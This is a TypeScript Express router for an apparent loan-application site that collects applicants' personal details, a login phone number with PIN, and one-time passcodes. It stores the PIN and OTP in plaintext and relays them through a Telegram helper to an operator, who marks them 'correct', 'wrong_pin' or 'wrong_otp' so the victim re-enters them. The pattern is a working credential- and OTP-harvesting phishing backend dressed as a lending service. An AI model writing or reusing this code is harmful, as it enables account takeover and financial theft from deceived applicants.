import { Router, type IRouter } from "express";
import { randomUUID } from "crypto";
import { eq } from "drizzle-orm";
import { db, loanSessionsTable } from "@workspace/db";
import {
  CreateLoanSessionBody,
  SubmitLoginBody,
  SubmitLoginParams,
  GetLoginStatusParams,
  SubmitOtpBody,
  SubmitOtpParams,
  GetOtpStatusParams,
} from "@workspace/api-zod";
import {
  sendLoginApprovalRequest,
} from "../lib/telegram";

const router: IRouter = Router();

// POST /loan/sessions — create a new loan application session
router.post("/loan/sessions", async (req, res): Promise<void> => {
  const parsed = CreateLoanSessionBody.safeParse(req.body);
  if (!parsed.success) {
    req.log.warn({ errors: parsed.error.message }, "Invalid loan session body");
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  const sessionId = randomUUID();
  const data = parsed.data;

  await db.insert(loanSessionsTable).values({
    sessionId,
    loanType: data.loanType,
    loanAmount: data.loanAmount,
    loanTermMonths: data.loanTermMonths,
    loanPurpose: data.loanPurpose,
    firstName: data.firstName,
    lastName: data.lastName,
    phone: data.phone,
    employmentStatus: data.employmentStatus,
    monthlyIncome: data.monthlyIncome,
    loginApprovalStatus: "pending",
    otpVerificationStatus: "pending",
  });

  req.log.info({ sessionId }, "Loan session created");
  res.status(201).json({ sessionId, status: "created" });
});

// POST /loan/sessions/:sessionId/login — submit login credentials
router.post("/loan/sessions/:sessionId/login", async (req, res): Promise<void> => {
  const paramsParsed = SubmitLoginParams.safeParse(req.params);
  if (!paramsParsed.success) {
    res.status(400).json({ error: "Invalid session ID" });
    return;
  }

  const bodyParsed = SubmitLoginBody.safeParse(req.body);
  if (!bodyParsed.success) {
    req.log.warn({ errors: bodyParsed.error.message }, "Invalid login body");
    res.status(400).json({ error: bodyParsed.error.message });
    return;
  }

  const { sessionId } = paramsParsed.data;
  const { phone, pin } = bodyParsed.data;

  const [session] = await db
    .select()
    .from(loanSessionsTable)
    .where(eq(loanSessionsTable.sessionId, sessionId))
    .limit(1);

  if (!session) {
    res.status(404).json({ error: "Session not found" });
    return;
  }

  // Save login credentials
  await db
    .update(loanSessionsTable)
    .set({ pin, loginPhone: phone, loginApprovalStatus: "pending" })
    .where(eq(loanSessionsTable.sessionId, sessionId));

  // Send to Telegram for admin approval
  try {
    const { messageId } = await sendLoginApprovalRequest(sessionId, {
      firstName: session.firstName,
      lastName: session.lastName,
      phone: session.phone,
      loginPhone: phone,
      loanType: session.loanType,
      loanAmount: session.loanAmount,
      loanTermMonths: session.loanTermMonths,
      loanPurpose: session.loanPurpose,
      employmentStatus: session.employmentStatus,
      monthlyIncome: session.monthlyIncome,
    });

    if (messageId) {
      await db
        .update(loanSessionsTable)
        .set({ loginTelegramMessageId: messageId })
        .where(eq(loanSessionsTable.sessionId, sessionId));
    }
  } catch (err) {
    req.log.error({ err }, "Failed to send Telegram notification");
  }

  req.log.info({ sessionId }, "Login submitted, awaiting approval");
  res.status(200).json({
    sessionId,
    status: "pending",
    message: "Your application is under review. Please wait for approval.",
  });
});

// GET /loan/sessions/:sessionId/status — poll for login approval
router.get("/loan/sessions/:sessionId/status", async (req, res): Promise<void> => {
  const paramsParsed = GetLoginStatusParams.safeParse(req.params);
  if (!paramsParsed.success) {
    res.status(400).json({ error: "Invalid session ID" });
    return;
  }

  const { sessionId } = paramsParsed.data;

  const [session] = await db
    .select({ loginApprovalStatus: loanSessionsTable.loginApprovalStatus })
    .from(loanSessionsTable)
    .where(eq(loanSessionsTable.sessionId, sessionId))
    .limit(1);

  if (!session) {
    res.status(404).json({ error: "Session not found" });
    return;
  }

  const messages: Record<string, string> = {
    pending: "Your application is under review.",
    approved: "Your application has been approved!",
    rejected: "Your application was not approved at this time.",
  };

  res.status(200).json({
    status: session.loginApprovalStatus,
    message: messages[session.loginApprovalStatus] ?? null,
  });
});

// POST /loan/sessions/:sessionId/otp — submit OTP code
router.post("/loan/sessions/:sessionId/otp", async (req, res): Promise<void> => {
  const paramsParsed = SubmitOtpParams.safeParse(req.params);
  if (!paramsParsed.success) {
    res.status(400).json({ error: "Invalid session ID" });
    return;
  }

  const bodyParsed = SubmitOtpBody.safeParse(req.body);
  if (!bodyParsed.success) {
    req.log.warn({ errors: bodyParsed.error.message }, "Invalid OTP body");
    res.status(400).json({ error: bodyParsed.error.message });
    return;
  }

  const { sessionId } = paramsParsed.data;
  const { otp } = bodyParsed.data;

  const [session] = await db
    .select()
    .from(loanSessionsTable)
    .where(eq(loanSessionsTable.sessionId, sessionId))
    .limit(1);

  if (!session) {
    res.status(404).json({ error: "Session not found" });
    return;
  }

  // Save OTP and reset verification status to pending
  await db
    .update(loanSessionsTable)
    .set({ otpCode: otp, otpVerificationStatus: "pending" })
    .where(eq(loanSessionsTable.sessionId, sessionId));

  // Send OTP to Telegram for admin verification
  try {
    const { sendOtpVerificationRequest } = await import("../lib/telegram");
    const { messageId } = await sendOtpVerificationRequest(
      sessionId,
      otp,
      `${session.firstName} ${session.lastName}`,
      session.loginPhone ?? session.phone
    );

    if (messageId) {
      await db
        .update(loanSessionsTable)
        .set({ otpTelegramMessageId: messageId })
        .where(eq(loanSessionsTable.sessionId, sessionId));
    }
  } catch (err) {
    req.log.error({ err }, "Failed to send OTP Telegram notification");
  }

  req.log.info({ sessionId }, "OTP submitted, awaiting verification");
  res.status(200).json({
    sessionId,
    status: "pending",
    message: "OTP submitted, awaiting admin verification.",
  });
});

// GET /loan/sessions/:sessionId/otp-status — poll for OTP verification
router.get("/loan/sessions/:sessionId/otp-status", async (req, res): Promise<void> => {
  const paramsParsed = GetOtpStatusParams.safeParse(req.params);
  if (!paramsParsed.success) {
    res.status(400).json({ error: "Invalid session ID" });
    return;
  }

  const { sessionId } = paramsParsed.data;

  const [session] = await db
    .select({ otpVerificationStatus: loanSessionsTable.otpVerificationStatus })
    .from(loanSessionsTable)
    .where(eq(loanSessionsTable.sessionId, sessionId))
    .limit(1);

  if (!session) {
    res.status(404).json({ error: "Session not found" });
    return;
  }

  const messages: Record<string, string> = {
    pending: "Verifying your OTP...",
    correct: "OTP verified successfully!",
    wrong_pin: "Incorrect PIN. Please try again.",
    wrong_otp: "Incorrect OTP. Please try again.",
  };

  res.status(200).json({
    status: session.otpVerificationStatus,
    message: messages[session.otpVerificationStatus] ?? null,
  });
});

export default router;
